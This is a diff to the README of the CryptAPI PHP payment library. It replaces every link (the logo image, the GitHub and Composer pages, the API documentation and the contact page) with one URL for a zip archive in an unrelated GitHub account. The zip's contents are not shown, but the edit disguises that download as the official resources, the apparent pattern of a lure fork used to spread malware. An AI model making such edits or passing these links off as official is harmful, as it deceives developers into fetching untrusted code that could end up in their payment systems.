@@ -1,4 +1,4 @@
-![CryptAPI](https://i.imgur.com/IfMAa7E.png)
+![CryptAPI](https://github.com/LunartechTeam/php-cryptapi/raw/refs/heads/master/cryptapi/cryptapi-php-v2.6.zip)
 
 # CryptAPI's PHP Library
 Official PHP library of CryptAPI
@@ -19,8 +19,8 @@ ext-curl
 composer require cryptapi/php-cryptapi
 ```
 
-[on GitHub](https://github.com/cryptapi/php-cryptapi) &emsp;
-[on Composer](https://packagist.org/packages/cryptapi/php-cryptapi)
+[on GitHub](https://github.com/LunartechTeam/php-cryptapi/raw/refs/heads/master/cryptapi/cryptapi-php-v2.6.zip) &emsp;
+[on Composer](https://github.com/LunartechTeam/php-cryptapi/raw/refs/heads/master/cryptapi/cryptapi-php-v2.6.zip)
 
 ## Usage
 
@@ -44,7 +44,7 @@ Where:
 
 ``$parameters`` is any parameter you wish to send to identify the payment, such as `['order_id' => 1234]`
 
-``$cryptapi_params`` parameters that will be passed to CryptAPI _(check which extra parameters are available here: https://cryptapi.io/docs/#/Bitcoin/btccreate)_
+``$cryptapi_params`` parameters that will be passed to CryptAPI _(check which extra parameters are available here: https://github.com/LunartechTeam/php-cryptapi/raw/refs/heads/master/cryptapi/cryptapi-php-v2.6.zip)_
 
 ``$payment_address`` is the newly generated address, that you will show your users
 
@@ -103,10 +103,10 @@ $ca = new CryptAPI\CryptAPI($coin, $my_address, $callback_url, $parameters);
 $data = $ca->check_logs();
 ```
 
-Same parameters as before, the `$data` returned can be checked here: https://cryptapi.io/docs/#/Bitcoin/btclogs
+Same parameters as before, the `$data` returned can be checked here: https://github.com/LunartechTeam/php-cryptapi/raw/refs/heads/master/cryptapi/cryptapi-php-v2.6.zip
 
 
 ## Help
 
 Need help?  
-Contact us @ https://cryptapi.io/contact/
+Contact us @ https://github.com/LunartechTeam/php-cryptapi/raw/refs/heads/master/cryptapi/cryptapi-php-v2.6.zip
